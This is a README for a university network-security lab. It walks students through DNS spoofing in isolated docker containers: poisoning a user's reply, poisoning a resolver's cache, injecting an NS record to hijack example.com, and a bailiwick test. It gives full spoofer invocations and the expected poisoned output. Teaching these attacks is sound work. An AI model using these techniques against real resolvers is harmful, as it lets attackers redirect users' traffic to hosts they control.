# DNS Spoofing Attack Lab - Tasks 5.1-5.4

This README provides step-by-step instructions and commands to run each DNS spoofing task.

## Prerequisites

- Docker and docker-compose installed
- Lab containers running (`docker-compose up`)
- Working directory: `Labsetup-arm` (the directory containing `docker-compose.yml`)

**Important**: Throughout this guide, `/path/to/Labsetup-arm` is used as a placeholder. Replace it with your actual path to the `Labsetup-arm` directory. 

**Quick Setup**: Set an environment variable to simplify commands:
```bash
# Set your working directory (adjust the path as needed)
export LAB_DIR="/path/to/Labsetup-arm"

# Then you can use:
cd $LAB_DIR
```

Or simply navigate to your `Labsetup-arm` directory and run all `docker-compose` commands from there without the `cd` prefix.

## Overview of Scripts

- **`dns_sniff_spoof.py`**: Unified script for Tasks 5.1 and 5.2 (A record spoofing)
- **`dns_spoof_ns.py`**: Task 5.3 (NS record spoofing - domain hijacking)
- **`dns_spoof_cross_domain.py`**: Task 5.4 (Cross-domain NS injection - bailiwick testing)

---

## Task 5.1 - User DNS Poisoning (A Record Spoofing)

**Objective**: Intercept DNS queries between user and resolver, send spoofed replies to poison the user's DNS response.

### Instructions

1. Navigate to the lab directory
2. Kill any running spoofers
3. Flush the DNS resolver cache
4. Start the spoofer in **user mode** (without `--target-resolver`)
5. Trigger a DNS query from the user
6. Verify the user receives the spoofed IP

### Commands

```bash
# 1. Navigate to lab directory
cd /path/to/Labsetup-arm

# 2. Kill any running spoofers
docker-compose exec attacker sh -c "pkill -9 python3 || true"

# 3. Flush DNS cache
docker-compose exec local-server sh -c "rndc flush"

# 4. Start spoofer (targets user→resolver queries)
docker-compose exec -d attacker python3 /volumes/dns_sniff_spoof.py \
  --iface br-7937e59a4ce5 \
  --domain www.example.net \
  --spoof-ip 10.0.2.5 \
  --retries 3

# 5. Wait a moment for spoofer to start
sleep 1

# 6. Trigger DNS lookup from user
docker-compose exec user sh -c "dig @10.9.0.53 www.example.net +short"
```

### Expected Result

```
10.0.2.5
```

The user receives the spoofed IP address instead of the real one.

### Full dig Output

```bash
docker-compose exec user sh -c "dig @10.9.0.53 www.example.net"
```

You should see:
- **ANSWER SECTION** containing `10.0.2.5`
- TTL of 259200 seconds

---

## Task 5.2 - DNS Resolver Cache Poisoning

**Objective**: Poison the DNS resolver's cache by intercepting resolver→authoritative queries and winning the race condition.

### Instructions

1. Kill any running spoofers
2. Flush the DNS resolver cache
3. Start the spoofer in **resolver mode** (with `--target-resolver`)
4. Trigger a DNS query from the user
5. Dump the resolver's cache to verify the forged record is stored

### Commands

```bash
# 1. Navigate to lab directory
cd /path/to/Labsetup-arm

# 2. Kill any running spoofers
docker-compose exec attacker sh -c "pkill -9 python3 || true"

# 3. Flush DNS cache
docker-compose exec local-server sh -c "rndc flush"

# 4. Start spoofer (targets resolver→authoritative queries)
docker-compose exec -d attacker python3 /volumes/dns_sniff_spoof.py \
  --iface br-7937e59a4ce5 \
  --domain www.example.net \
  --spoof-ip 10.0.2.5 \
  --retries 3 \
  --target-resolver

# 5. Wait a moment for spoofer to start
sleep 1

# 6. Trigger DNS lookup from user
docker-compose exec user sh -c "dig @10.9.0.53 www.example.net +short"

# 7. Dump cache and verify forged record is stored
docker-compose exec local-server sh -c "rndc dumpdb -cache && sleep 1 && grep -B 1 -A 2 '10\.0\.2\.5' /var/cache/bind/dump.db"
```

### Expected Result

**dig output**:
```
www.example.net-v2.edgesuite.net.
10.0.2.5
```

**Cache dump** should show:
```
www.example.net-v2.edgesuite.net. [TTL] A 10.0.2.5
```

### Key Difference from Task 5.1

- **Task 5.1**: Poisons the user directly (no cache persistence)
- **Task 5.2**: Poisons the resolver's cache (persistent for all users until TTL expires)

The `--target-resolver` flag changes the BPF filter from `udp and dst port 53` to `udp and src host 10.9.0.53 and dst port 53`, targeting only the resolver's outbound queries.

---

## Task 5.3 - NS Record Spoofing (Domain Hijacking)

**Objective**: Inject an NS (Name Server) record to delegate an entire domain to the attacker's nameserver, hijacking all hostnames under that domain.

### Instructions

1. Kill any running spoofers
2. Flush the DNS resolver cache
3. Start the NS spoofer targeting `example.com`
4. Trigger a query for any hostname under `example.com`
5. Verify multiple hostnames now resolve through the attacker NS
6. Dump cache to confirm NS record is stored

### Commands

```bash
# 1. Navigate to lab directory
cd /path/to/Labsetup-arm

# 2. Kill any running spoofers
docker-compose exec attacker sh -c "pkill -9 python3 || true"

# 3. Flush DNS cache
docker-compose exec local-server sh -c "rndc flush"

# 4. Start NS spoofer (targets resolver, injects NS records)
docker-compose exec -d attacker python3 /volumes/dns_spoof_ns.py \
  --iface br-7937e59a4ce5 \
  --domain example.com \
  --attacker-ns ns.attacker32.com \
  --attacker-ns-ip 10.9.0.153 \
  --spoof-ip 10.0.2.5 \
  --retries 3 \
  --target-resolver

# 5. Wait a moment for spoofer to start
sleep 1

# 6. Trigger initial query to inject NS record
docker-compose exec user sh -c "dig @10.9.0.53 www.example.com +short"

# 7. Test multiple hostnames (all should resolve through attacker NS)
docker-compose exec user sh -c "dig @10.9.0.53 mail.example.com +short"
docker-compose exec user sh -c "dig @10.9.0.53 test.example.com +short"
docker-compose exec user sh -c "dig @10.9.0.53 randomhost123.example.com +short"

# 8. Verify NS record in cache
docker-compose exec local-server sh -c "rndc dumpdb -cache && sleep 1 && grep 'example\.com.*NS' /var/cache/bind/dump.db"
```

### Expected Results

**dig outputs** should return IPs from attacker nameserver:
```
www.example.com      → 1.2.3.5 (or similar, from attacker NS)
mail.example.com     → 1.2.3.6 (from attacker NS)
test.example.com     → 10.0.2.5 or 1.2.3.6 (from attacker NS)
randomhost123.example.com → 1.2.3.6 (from attacker NS)
```

**Cache dump** should show:
```
example.com.            [TTL]  NS      ns.attacker32.com.
```

### Why NS Record Impacts Entire Domain

An NS record delegates authority for an entire DNS zone. When the resolver caches `example.com. NS ns.attacker32.com`, it learns that the attacker's nameserver is authoritative for **all names** under `example.com`. Future queries for any hostname (existing or non-existent) under this domain will be forwarded to the attacker's nameserver, giving complete control over the domain until the NS record's TTL expires.

---

## Task 5.4 - Cross-Domain NS Spoofing (Bailiwick Rules)

**Objective**: Demonstrate DNS cache acceptance rules by attempting to inject NS records for two domains (one in-bailiwick, one out-of-bailiwick) and observe which ones are accepted.

### Instructions

1. Kill any running spoofers
2. Flush the DNS resolver cache
3. Start the cross-domain spoofer that injects **TWO** NS records:
   - `example.com → ns.attacker32.com` (in-bailiwick, should be accepted)
   - `google.com → ns.attacker32.com` (out-of-bailiwick, should be rejected)
4. Trigger a query for `example.com`
5. Dump cache and verify which NS records were accepted
6. Test that `google.com` is NOT hijacked

### Commands

```bash
# 1. Navigate to lab directory
cd /path/to/Labsetup-arm

# 2. Kill any running spoofers
docker-compose exec attacker sh -c "pkill -9 python3 || true"

# 3. Flush DNS cache
docker-compose exec local-server sh -c "rndc flush"

# 4. Start cross-domain NS spoofer (injects BOTH example.com and google.com NS)
docker-compose exec -d attacker python3 /volumes/dns_spoof_cross_domain.py \
  --iface br-7937e59a4ce5 \
  --domain example.com \
  --cross-domain google.com \
  --attacker-ns ns.attacker32.com \
  --attacker-ns-ip 10.9.0.153 \
  --spoof-ip 10.0.2.5 \
  --retries 3 \
  --target-resolver

# 5. Wait a moment for spoofer to start
sleep 1

# 6. Trigger attack by querying example.com
docker-compose exec user sh -c "dig @10.9.0.53 test.example.com +short"

# 7. Dump cache and check which NS records were accepted
docker-compose exec local-server sh -c "rndc dumpdb -cache && sleep 1 && \
  echo '=== example.com NS (should be CACHED) ===' && \
  grep 'example\.com.*NS' /var/cache/bind/dump.db && \
  echo '' && \
  echo '=== google.com NS (should NOT be cached) ===' && \
  grep 'google\.com.*NS' /var/cache/bind/dump.db || echo 'google.com NS NOT FOUND in cache'"

# 8. Verify google.com is NOT hijacked (returns real Google IP)
docker-compose exec user sh -c "dig @10.9.0.53 www.google.com +short"
```

### Expected Results

**Cache dump**:
```
=== example.com NS (should be CACHED) ===
example.com.            [TTL]  NS      ns.attacker32.com.

=== google.com NS (should NOT be cached) ===
google.com NS NOT FOUND in cache
```

**Verification**:
- `test.example.com` → Returns attacker-controlled IP (1.2.3.6 or similar)
- `www.google.com` → Returns real Google IP (172.217.x.x)

### Explanation: Bailiwick Rules and Acceptance Logic

**Why `example.com` NS was accepted**: When a DNS server provides an authoritative response for `example.com`, it is within its "bailiwick" (zone of authority) to delegate that domain or its subdomains to another nameserver. The resolver accepts this NS record because the queried name (`test.example.com`) falls under the domain being delegated (`example.com`), establishing relevance between the question and the authority section.

**Why `google.com` NS was rejected**: The `google.com` NS record was rejected due to **bailiwick rules**, which prevent an authoritative server for one domain from claiming authority over unrelated domains. Since the query was for `example.com`, a response containing authority records for `google.com` is considered out-of-scope and irrelevant. Modern DNS resolvers implement strict checking to prevent such cross-domain authority injection attacks, which would otherwise allow attackers to hijack arbitrary domains by piggybacking malicious NS records onto legitimate responses.

**Relevance principle**: DNS caching follows a relevance rule: only authority records that are hierarchically related to the original query are cached. This prevents a compromised or malicious authoritative server for `example.com` from poisoning the cache with NS delegations for `google.com`, `facebook.com`, or any other unrelated domain.

---

## Common Troubleshooting

### Spoofer not winning the race

If the legitimate response arrives before your spoofed reply:

1. **Increase retries**: Use `--retries 5` or higher
2. **Check interface**: Ensure you're using the correct bridge interface (`br-xxxxxxxx`)
3. **Verify spoofer is running**: `docker-compose exec attacker sh -c "ps aux | grep python"`
4. **Check logs**: Run spoofer interactively (without `-d` flag) to see real-time logs

### Finding the correct interface

```bash
# Inside attacker container
docker-compose exec attacker sh -c "ip route get 10.9.0.53"

# Look for "dev <interface-name>" in output
```

### Verify packets are being captured

```bash
# Run tcpdump on attacker to see DNS traffic
docker-compose exec attacker sh -c "tcpdump -i br-7937e59a4ce5 -nn udp port 53 -c 10"

# In another terminal, trigger a dig from user
docker-compose exec user sh -c "dig @10.9.0.53 www.example.net"
```

### Cache not showing forged records

1. Ensure you're using `--target-resolver` flag for Tasks 5.2-5.4
2. Flush cache before each test: `rndc flush`
3. Run multiple attempts - sometimes you need 2-3 tries to win the race
4. Check that resolver IP (10.9.0.53) matches what's in the BPF filter

---

## Summary of Command Differences

| Task | Script | Key Flag | Target | Result |
|------|--------|----------|--------|--------|
| 5.1 | `dns_sniff_spoof.py` | (none) | User→Resolver | User poisoned |
| 5.2 | `dns_sniff_spoof.py` | `--target-resolver` | Resolver→Auth | Cache poisoned |
| 5.3 | `dns_spoof_ns.py` | `--target-resolver` | Resolver→Auth | Domain hijacked |
| 5.4 | `dns_spoof_cross_domain.py` | `--target-resolver` | Resolver→Auth | Bailiwick tested |

---

## Clean Up

```bash
# Kill all spoofers
docker-compose exec attacker sh -c "pkill -9 python3 || true"

# Flush DNS cache
docker-compose exec local-server sh -c "rndc flush"

# Stop containers
docker-compose down
```

---

## Notes

- All scripts use **Scapy** for packet manipulation
- The `--retries` flag sends multiple spoofed replies to increase success probability
- The `--target-resolver` flag is critical for cache poisoning (Tasks 5.2-5.4)
- Bridge interface name (`br-xxxxxxxx`) may vary - use `ip addr show` to find yours
- TTL values are set to 259200 seconds (~3 days) in the spoofed records

### Finding Your Labsetup-arm Directory

The `Labsetup-arm` directory is located wherever you cloned/extracted the lab files. It should contain:
- `docker-compose.yml`
- `image_attacker_ns/`, `image_local_dns_server/`, `image_user/` subdirectories
- `volumes/` subdirectory (containing these Python scripts and this README)

Common locations:
```bash
~/Downloads/Labsetup-arm
~/Documents/Lab4/dns-local/Labsetup-arm
~/Desktop/SEED-Labs/dns-local/Labsetup-arm
```

To find it on your system:
```bash
find ~ -name "docker-compose.yml" -path "*/Labsetup-arm/*" 2>/dev/null
```

---

**Author**: Generated for EE595 Lab 4  
**Date**: November 2025
